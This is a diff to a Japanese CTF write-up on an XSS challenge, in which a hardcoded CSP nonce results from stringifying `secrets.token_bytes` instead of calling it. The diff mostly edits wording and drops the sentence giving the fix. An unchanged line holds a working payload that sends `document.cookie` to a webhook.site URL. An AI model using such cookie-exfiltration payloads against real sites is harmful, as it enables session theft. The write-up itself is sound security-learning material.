@@ -10,7 +10,7 @@ Admin Bot 系のチャレンジは`bot`のCookieを外部にリークさせる�
 
 では`web`で何ができるのか調べます。初期状態で画面上には`Hello Programmer!`と表示されていますが、この`programmer`の部分はクエリストリングで任意の値に書き換えることができます。例えばURLの末尾に`?username=bob`とすると、画面に`Hello bob!`と出力されるのが確認できます。
 
-典型的なXSSの問題では`username`にスクリプトタグやimgタグを設定することでhtmlソースコード内にスクリプトを埋め込むのですが、今回はContents Security Policyが以下のように厳密に設定されているためスクリプトは無効化されます。
+典型的なXSSの問題では`username`にスクリプトタグやimgタグを設定することで、htmlソースコード内にスクリプトを埋め込むのですが、今回はContents Security Policyが以下のように厳密に設定されているためスクリプトは無効化されます。
 
 ```js
 @app.after_request
@@ -57,10 +57,10 @@ nonceは本来ページ更新の度に新しい値がセットするため予測
 ?username=<script nonce="PGZ1bmN0aW9uIHRva2VuX2J5dGVzIGF0IDB4N2ZlODQ5M2M5ZmUwPg==">location.href = "https://webhook.site/550e8400-e29b-41d4-a716-446655440000?cookie="%2Bdocument.cookie</script>
 ```
 
-なぜnonceが固定になってしまったかはbase64デコードすると分かります。
+ところで、なぜnonceが固定になってしまったかはbase64デコードすると分かります。
 
 ```
 <function token_bytes at 0x7fe8493c9fe0>
 ```
 
-本来は`str(secrets.token_bytes(16))`としなければならない所を`str(secrets.token_bytes)`としてしまったため、関数自体が文字列化されてしまい正しくランダムなnonceになりませんでした。したがって`str(secrets.token_bytes(16))`と直すと解決します。
+本来は`str(secrets.token_bytes(16))`としなければならない所を`str(secrets.token_bytes)`としてしまったため、関数自体が文字列化されてしまい正しくランダムなnonceになりませんでした。
